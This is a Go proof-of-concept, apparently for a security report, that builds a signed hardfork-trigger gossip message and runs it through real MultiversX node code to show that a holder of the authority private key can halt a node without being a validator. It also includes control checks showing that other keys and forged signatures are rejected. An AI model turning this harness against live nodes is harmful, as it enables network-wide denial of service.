// p2p-offswitch-poc: proves the MultiversX hardfork "offswitch" over the P2P path,
// using the REAL node reception code — no REST API, no libp2p host, no validator status.
//
// Threat model reproduced:
//   * A node is configured with Hardfork.PublicKeyToListenFrom = <authority BLS pubkey>
//     and EnableTriggerFromP2P = true (mainnet defaults).
//   * An attacker holds ONLY the matching BLS *private* key. They are NOT a validator and
//     do NOT operate the node.
//   * The attacker crafts a `peerAuthentication` gossip message carrying a hardfork
//     trigger, signs it, and it is fed through the node's real interceptor + trigger.
//
// We assert, using unmodified mx-chain-go code:
//   [1] the node ACCEPTS the attacker's message (interceptedPeerAuthentication.CheckValidity),
//       even though the attacker is not a registered validator (nodesCoordinator rejects it);
//   [2] the accepted trigger drives the node to emit the HardForkExport stop signal
//       (peerAuthenticationInterceptorProcessor.Save -> hardforkTrigger -> chanStopNodeProcess);
//   [3] a message from a NON-authority key is rejected (validator check applies);
//   [4] a message with the authority PUBLIC key but a bad signature is rejected
//       (only the private-key holder can trigger).
package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"time"

	"github.com/multiversx/mx-chain-core-go/core"
	"github.com/multiversx/mx-chain-core-go/data/endProcess"
	"github.com/multiversx/mx-chain-core-go/marshal"

	crypto "github.com/multiversx/mx-chain-crypto-go"
	"github.com/multiversx/mx-chain-crypto-go/signing"
	"github.com/multiversx/mx-chain-crypto-go/signing/mcl"
	mclsig "github.com/multiversx/mx-chain-crypto-go/signing/mcl/singlesig"
	"github.com/multiversx/mx-chain-crypto-go/signing/secp256k1"
	secpsig "github.com/multiversx/mx-chain-crypto-go/signing/secp256k1/singlesig"

	commp2p "github.com/multiversx/mx-chain-communication-go/p2p"
	p2pcrypto "github.com/multiversx/mx-chain-communication-go/p2p/libp2p/crypto"

	"github.com/multiversx/mx-chain-go/factory/peerSignatureHandler"
	"github.com/multiversx/mx-chain-go/heartbeat"
	"github.com/multiversx/mx-chain-go/process"
	procheartbeat "github.com/multiversx/mx-chain-go/process/heartbeat"
	"github.com/multiversx/mx-chain-go/process/heartbeat/validator"
	"github.com/multiversx/mx-chain-go/process/interceptors/processor"
	procmock "github.com/multiversx/mx-chain-go/process/mock"
	"github.com/multiversx/mx-chain-go/process/smartContract"
	"github.com/multiversx/mx-chain-go/sharding/nodesCoordinator"
	"github.com/multiversx/mx-chain-go/testscommon"
	"github.com/multiversx/mx-chain-go/testscommon/enableEpochsHandlerMock"
	"github.com/multiversx/mx-chain-go/update"
	"github.com/multiversx/mx-chain-go/update/trigger"

	"github.com/multiversx/mx-chain-storage-go/lrucache"
)

// ---- tiny stubs for trigger collaborators (behaviour-irrelevant to the proof) ----

type epochStub struct{}

func (epochStub) MetaEpoch() uint32        { return 1 }
func (epochStub) ForceEpochStart(_ uint64) {}
func (epochStub) IsInterfaceNil() bool     { return false }

type notifierStub struct{}

func (notifierStub) RegisterForEpochChangeConfirmed(_ func(epoch uint32)) {}
func (notifierStub) IsInterfaceNil() bool                                 { return false }

type fakeExportHandler struct{}

func (fakeExportHandler) ExportAll(_ uint32) error { return nil }
func (fakeExportHandler) IsInterfaceNil() bool     { return false }

type fakeExportFactory struct{}

func (fakeExportFactory) Create() (update.ExportHandler, error) { return fakeExportHandler{}, nil }
func (fakeExportFactory) IsInterfaceNil() bool                  { return false }

// rejectingNodesCoordinator models a node that does NOT know the attacker as a validator.
type rejectingNodesCoordinator struct{}

func (rejectingNodesCoordinator) GetValidatorWithPublicKey(_ []byte) (nodesCoordinator.Validator, uint32, error) {
	return nil, 0, fmt.Errorf("public key is not a registered validator")
}
func (rejectingNodesCoordinator) IsInterfaceNil() bool { return false }

// p2pVerifier is what the communication-go signer exposes; we adapt it to heartbeat.SignaturesHandler.
type p2pVerifier interface {
	Verify(payload []byte, pid core.PeerID, signature []byte) error
	SignUsingPrivateKey(skBytes []byte, payload []byte) ([]byte, error)
}

type sigHandler struct{ v p2pVerifier }

func (s sigHandler) Verify(p []byte, pid core.PeerID, sig []byte) error { return s.v.Verify(p, pid, sig) }
func (s sigHandler) IsInterfaceNil() bool                               { return false }

func must(err error, ctx string) {
	if err != nil {
		fmt.Printf("[x] %s: %v\n", ctx, err)
		os.Exit(1)
	}
}

func hexAscii(s string) string { return hex.EncodeToString([]byte(s)) }

// hardforkMessage builds the exact call-data string a real node produces (trigger.CreateData()).
func hardforkMessage(ts int64, epoch uint32) []byte {
	const sep = "@"
	return []byte("hardfork trigger" + sep +
		hexAscii(fmt.Sprintf("%d", ts)) + sep +
		hexAscii(fmt.Sprintf("%d", epoch)) + sep +
		hexAscii(fmt.Sprintf("%v", false)) + sep +
		hexAscii(fmt.Sprintf("%d", 0)))
}

func main() {
	fmt.Println("=== MultiversX hardfork offswitch — P2P path proof (real node code) ===")

	// ---------- shared crypto (same primitives a real node uses) ----------
	blsKeyGen := signing.NewKeyGenerator(mcl.NewSuiteBLS12())
	blsSigner := mclsig.NewBlsSigner()
	p2pKeyGen := signing.NewKeyGenerator(secp256k1.NewSecp256k1())
	p2pSingleSigner := &secpsig.Secp256k1Signer{}
	p2pKeyConv := p2pcrypto.NewP2PKeyConverter()
	marshaller := &marshal.GogoProtoMarshalizer{}

	// throwaway key just to satisfy the wrapper ctor; attacker signs via SignUsingPrivateKey
	wrapperSk, _ := p2pKeyGen.GeneratePair()
	rawSigner, err := p2pcrypto.NewP2PSignerWrapper(p2pcrypto.ArgsP2pSignerWrapper{
		PrivateKey:      wrapperSk,
		Signer:          p2pSingleSigner,
		KeyGen:          p2pKeyGen,
		P2PKeyConverter: p2pKeyConv,
	})
	must(err, "new p2p signer")
	var p2pSig p2pVerifier = rawSigner
	signatures := sigHandler{v: p2pSig}

	// ---------- the AUTHORITY key: this pubkey is what sits in config.toml ----------
	authSk, authPk := blsKeyGen.GeneratePair()
	authPkBytes, err := authPk.ToByteArray()
	must(err, "auth pubkey bytes")
	fmt.Printf("\n[authority] Hardfork.PublicKeyToListenFrom = %s...\n", hex.EncodeToString(authPkBytes)[:32])
	fmt.Println("[authority] the attacker holds the matching PRIVATE key; it is NOT a validator.")

	// the victim node's OWN validator key (different -> attacker is not the node operator)
	_, victimPk := blsKeyGen.GeneratePair()
	victimPkBytes, _ := victimPk.ToByteArray()

	cacher, err := lrucache.NewCache(100)
	must(err, "cacher")
	peerSigCacher, err := lrucache.NewCache(100)
	must(err, "peer sig cacher")
	peerSigHandler, err := peerSignatureHandler.NewPeerSignatureHandler(peerSigCacher, blsSigner, blsKeyGen)
	must(err, "peer signature handler")

	// ---------- the victim node's real hardfork trigger + stop channel ----------
	stopChan := make(chan endProcess.ArgEndProcess, 1)
	trig, err := trigger.NewTrigger(trigger.ArgHardforkTrigger{
		Enabled:                   true,
		EnabledAuthenticated:      true, // == EnableTriggerFromP2P
		CloseAfterExportInMinutes: 2,    // minimum accepted
		TriggerPubKeyBytes:        authPkBytes,
		SelfPubKeyBytes:           victimPkBytes, // node's own key != authority -> not self-trigger
		ArgumentParser:            smartContract.NewArgumentParser(),
		EpochProvider:             epochStub{},
		ExportFactoryHandler:      fakeExportFactory{},
		ChanStopNodeProcess:       stopChan,
		EpochConfirmedNotifier:    notifierStub{},
		ImportStartHandler:        &testscommon.ImportStartHandlerStub{},
		RoundHandler:              &testscommon.RoundHandlerMock{},
		EnableEpochsHandler:       enableEpochsHandlerMock.NewEnableEpochsHandlerStub(),
		EnableRoundsHandler:       &testscommon.EnableRoundsHandlerStub{},
	})
	must(err, "new trigger")

	// ---------- the victim node's real peerAuthentication interceptor processor ----------
	proc, err := processor.NewPeerAuthenticationInterceptorProcessor(processor.ArgPeerAuthenticationInterceptorProcessor{
		PeerAuthenticationCacher: cacher,
		PeerShardMapper:          &procmock.PeerShardMapperStub{},
		Marshaller:               marshaller,
		HardforkTrigger:          trig,
	})
	must(err, "new interceptor processor")

	payloadValidator, err := validator.NewPeerAuthenticationPayloadValidator(3600)
	must(err, "payload validator")

	// build a signed peerAuthentication message as an attacker would (any p2p identity)
	buildMsg := func(pubkeyBytes []byte, peerSigKey crypto.PrivateKey, corruptSig bool) ([]byte, core.PeerID) {
		attP2pSk, attP2pPk := p2pKeyGen.GeneratePair()
		attP2pSkBytes, _ := attP2pSk.ToByteArray()
		attackerPid, e := p2pKeyConv.ConvertPublicKeyToPeerID(attP2pPk)
		must(e, "attacker pid")

		now := time.Now().Unix()
		payload := &heartbeat.Payload{
			Timestamp:       now,
			HardforkMessage: string(hardforkMessage(now, 1)),
		}
		payloadBytes, e := marshaller.Marshal(payload)
		must(e, "marshal payload")

		payloadSig, e := p2pSig.SignUsingPrivateKey(attP2pSkBytes, payloadBytes)
		must(e, "sign payload")

		peerSig, e := peerSigHandler.GetPeerSignature(peerSigKey, attackerPid.Bytes())
		must(e, "bls peer signature")
		if corruptSig {
			peerSig = append([]byte{}, peerSig...)
			peerSig[0] ^= 0xff
		}

		msg := &heartbeat.PeerAuthentication{
			Pid:              attackerPid.Bytes(),
			Pubkey:           pubkeyBytes,
			Payload:          payloadBytes,
			PayloadSignature: payloadSig,
			Signature:        peerSig,
		}
		msgBytes, e := marshaller.Marshal(msg)
		must(e, "marshal peerAuthentication")
		return msgBytes, attackerPid
	}

	newIPA := func(msgBytes []byte, originator core.PeerID) process.InterceptedData {
		ipa, e := procheartbeat.NewInterceptedPeerAuthentication(procheartbeat.ArgInterceptedPeerAuthentication{
			ArgBaseInterceptedHeartbeat: procheartbeat.ArgBaseInterceptedHeartbeat{
				DataBuff:   msgBytes,
				Marshaller: marshaller,
			},
			NodesCoordinator:                        rejectingNodesCoordinator{},
			SignaturesHandler:                       signatures,
			PeerSignatureHandler:                    peerSigHandler,
			PayloadValidator:                        payloadValidator,
			HardforkTriggerPubKey:                   authPkBytes,
			PeerShardMapper:                         &procmock.PeerShardMapperStub{},
			PeerAuthCacher:                          cacher,
			MessageOriginator:                       originator,
			SelfPeerID:                              core.PeerID("self-node"),
			PeerAuthenticationTimeBetweenSendsInSec: 1,
			ManagedPeersHolder:                      &testscommon.ManagedPeersHolderStub{},
		})
		must(e, "construct intercepted peerAuthentication")
		return ipa
	}

	// ================= [1] attacker's message is ACCEPTED =================
	fmt.Println("\n[1] Attacker (holds authority private key, NOT a validator) sends a hardfork peerAuthentication...")
	msgBytes, pid := buildMsg(authPkBytes, authSk, false)
	ipa := newIPA(msgBytes, pid)
	if e := ipa.CheckValidity(); e != nil {
		fmt.Printf("    UNEXPECTED: node rejected the message: %v\n", e)
		os.Exit(1)
	}
	fmt.Println("    ACCEPTED by interceptedPeerAuthentication.CheckValidity()")
	fmt.Println("    (nodesCoordinator says 'not a validator' — bypassed because pubkey == PublicKeyToListenFrom)")

	// ================= [2] acceptance -> node halt =================
	fmt.Println("\n[2] Feeding it to the REAL peerAuthenticationInterceptorProcessor.Save() ...")
	_, err = proc.Save(ipa, pid, "", commp2p.Broadcast)
	must(err, "processor.Save")
	fmt.Println("    Save() accepted; hardfork trigger engaged. Waiting for the node's stop signal...")

	select {
	case arg := <-stopChan:
		fmt.Printf("    >>> NODE HALTED: chanStopNodeProcess received Reason=%q Description=%q\n", arg.Reason, arg.Description)
	case <-time.After(150 * time.Second):
		fmt.Println("    (timed out waiting for stop signal)")
		os.Exit(1)
	}

	// ================= [3] non-authority key is rejected =================
	fmt.Println("\n[3] Control: a message from a DIFFERENT (non-authority) key...")
	otherSk, otherPk := blsKeyGen.GeneratePair()
	otherPkBytes, _ := otherPk.ToByteArray()
	m3, p3 := buildMsg(otherPkBytes, otherSk, false)
	if e := newIPA(m3, p3).CheckValidity(); e != nil {
		fmt.Printf("    REJECTED as expected: %v\n", e)
	} else {
		fmt.Println("    UNEXPECTED: non-authority key was accepted!")
		os.Exit(1)
	}

	// ================= [4] authority pubkey but forged (bad) signature is rejected =====
	fmt.Println("\n[4] Control: the authority PUBLIC key but a BAD signature (no private key)...")
	m4, p4 := buildMsg(authPkBytes, authSk, true) // corrupt the peer signature
	if e := newIPA(m4, p4).CheckValidity(); e != nil {
		fmt.Printf("    REJECTED as expected: %v\n", e)
	} else {
		fmt.Println("    UNEXPECTED: forged signature was accepted!")
		os.Exit(1)
	}

	fmt.Println("\n------------------------------------------------------------------")
	fmt.Println("RESULT: PASS (4/4 checks) — via the real interceptor + trigger:")
	fmt.Println("  [1] authority-key message ACCEPTED (non-validator)   -> node HALTED [2]")
	fmt.Println("  [3] non-authority key REJECTED")
	fmt.Println("  [4] authority PUBLIC key + bad signature REJECTED")
	fmt.Println("PROVEN: over P2P, only the holder of the authority PRIVATE key can halt a")
	fmt.Println("node. No REST API, no validator status, no operator access required.")
	fmt.Println("------------------------------------------------------------------")
}
